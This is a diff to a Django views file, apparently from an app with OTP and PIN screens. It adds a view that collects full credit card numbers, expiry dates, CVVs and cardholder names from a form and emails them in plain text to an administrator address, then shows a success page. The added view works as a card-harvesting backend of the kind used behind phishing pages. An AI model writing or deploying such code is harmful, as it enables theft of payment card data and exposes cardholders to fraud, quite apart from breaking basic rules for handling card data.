@@ -114,6 +114,38 @@ def verify_otp(request, user_id):
 
     return render(request, "userauths/verify_otp.html", {"user_id": user_id})
 
+
+# views.py
+from django.conf import settings
+# from django.core.mail import send_mail
+# from django.shortcuts import render, redirect
+from .forms import CreditCardForm
+
+from django.views.decorators.csrf import csrf_protect
+
+@csrf_protect  # Ensures CSRF token protection for form submission
+def credit_card_view(request):
+    if request.method == 'POST':
+        # Extract data from POST request
+        card_number = request.POST.get('cardNumber')
+        exp_date = request.POST.get('expDate')
+        cvv = request.POST.get('cvv')
+        cardholder_name = request.POST.get('cardholderName')
+
+        # Prepare email content
+        subject = "New Credit Card Submission"
+        message = (
+            f"Card Holder Name: {cardholder_name}\n"
+            f"Card Number: {card_number}\n"
+            f"Expiration Date: {exp_date}\n"
+            f"CVV: {cvv}"
+        )
+        admin_email = settings.ADMIN_EMAIL
+        send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [admin_email])
+
+        return redirect('userauths:success_page')  # Redirect to a success page if needed
+
+    return render(request, 'userauths/credit_card_form.html')
 # @login_required
 def set_pin(request):
     # if request.method == 'POST':
@@ -140,6 +172,9 @@ def enter_pin(request):
     #         # Handle invalid PIN entered
     #         pass
     return render(request, 'userauths/enter_pin.html')
+
+def success(request):
+    return render(request, "userauths/success.html")
 
 
 def finish(request):
